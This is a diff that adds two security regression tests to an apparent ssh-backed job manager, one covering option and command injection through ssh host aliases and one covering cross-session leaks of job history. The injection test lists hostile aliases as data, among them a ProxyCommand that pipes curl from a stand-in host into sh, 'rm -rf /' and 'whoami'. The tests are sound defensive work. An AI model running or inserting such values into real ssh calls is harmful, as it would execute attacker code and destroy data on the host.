@@ -1442,3 +1442,61 @@ def test_harvest_of_hostile_archive_is_not_a_success(mgr, tmp_path):
     assert out["exit_code"] == 0
     assert out["error_kind"] == "unsafe_archive"
     assert out["output_files"] == []
+
+
+def test_an_ssh_alias_cannot_be_read_as_an_option(mgr):
+    """`ssh` parses a leading `-` as an option, and the alias comes from an
+    agent-supplied provider string.
+
+    `ssh -oProxyCommand=<cmd> host` runs `<cmd>` on *this* machine before any
+    connection is attempted. Every ssh and scp argv in the manager takes its
+    destination from `_split`, so the check belongs there rather than at each
+    of the nine call sites -- one of which reads the alias back out of a
+    database row.
+    """
+    assert mgr._split("ssh:lab") == ("ssh", "lab")
+    assert mgr._split("ssh:user@lab.example.org") == ("ssh", "user@lab.example.org")
+
+    for hostile in (
+        "-oProxyCommand=curl evil.example|sh",
+        "-F/tmp/attacker-config",
+        "lab example",
+        "lab\nrm -rf /",
+        "lab;whoami",
+        "-",
+        " ",
+    ):
+        with pytest.raises(ComputeError) as refused:
+            mgr._split(f"ssh:{hostile}")
+        assert refused.value.error_kind == "invalid_request"
+
+
+def test_job_history_answers_only_about_this_session_s_jobs(mgr):
+    """The event stream leaked across sessions.
+
+    `result` and `cancel` resolve through `self._jobs`, which `_rehydrate`
+    fills owner-scoped, so they answer only about jobs this session submitted.
+    `job_history` reached past that straight into the store with a
+    caller-supplied id and no test at all -- making any job's submitted
+    command, remote host, phases, failure reasons and harvest manifest readable
+    from any session that could name its id.
+
+    A job id that is not ours must be indistinguishable from one that does not
+    exist, or the refusal itself confirms the job.
+    """
+    with pytest.raises(ComputeError) as unknown:
+        mgr.job_history({"job_id": "job-never-existed"})
+    assert unknown.value.error_kind == "not_found"
+
+    with pytest.raises(ComputeError) as foreign:
+        mgr.job_history({"job_id": "job-belongs-to-another-session"})
+    assert foreign.value.error_kind == "not_found"
+    assert str(unknown.value) == str(foreign.value).replace(
+        "job-belongs-to-another-session", "job-never-existed"
+    )
+
+    # Its own job is readable.
+    job = _ssh_job(mgr, job_id="job-mine")
+    history = mgr.job_history({"job_id": job["job_id"]})
+    assert history["job_id"] == "job-mine"
+    assert isinstance(history["events"], list)
